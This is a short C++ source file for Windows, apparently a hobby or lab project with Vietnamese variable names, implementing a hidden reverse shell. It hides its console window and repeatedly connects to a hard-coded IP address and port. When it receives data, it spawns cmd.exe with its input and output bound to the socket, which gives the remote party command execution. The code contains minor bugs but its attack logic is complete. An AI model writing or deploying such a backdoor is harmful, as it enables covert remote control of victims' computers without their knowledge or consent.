#include"thong.h"
void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main()
{
	HideConsole();
	while (true)
	{
		Sleep(5000);

		WSADATA wsa;
		WSAStartup(MAKEWORD(2, 2), &wsa);

		SOCKET socket;
		socket = WSASocketW(2, 1, 6, 0, 0, 0);
	
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		string diachiip = "192.168.1.113";
		inet_pton(AF_INET, diachiip.c_str(), &addr.sin_addr);
		addr.sin_port = htons(6987);
		if (WSAConnect(socket, (sockaddr*)&addr, sizeof(sockaddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(socket);
			WSACleanup();
		}
		else
		{
			char nhanduoc[1024];
			ZeroMemory(nhanduoc, 0, sizeof(nhanduoc));
			int nhan = recv(socket, nhanduoc, 1024, 0);
			if (nhanduoc <= 0)
			{
				closesocket(socket);
				WSACleanup();
			}
			else
			{
				char Process[] = "cmd.exe";
				STARTUPINFOA startup;
				PROCESS_INFORMATION processinfo;
				memset(&startup, 0, sizeof(startup));
				startup.cb = sizeof(startup);
				startup.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				startup.hStdInput = startup.hStdOutput = startup.hStdError = (HANDLE)socket;
				BOOL checkSeDebugPrivilege;

				CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &startup, &processinfo);
				WaitForSingleObject(processinfo.hProcess, INFINITE);
				CloseHandle(processinfo.hProcess);
				CloseHandle(processinfo.hThread);
				ZeroMemory(nhanduoc, 0, sizeof(nhanduoc));
				int nhan = recv(socket, nhanduoc, sizeof(nhanduoc), 0);
				if (nhanduoc <= 0)
				{
					closesocket(socket);
					WSACleanup();
				}
				if (strcmp(nhanduoc, "exit\n") == 0)
					exit(0);
			}
		}

	}
}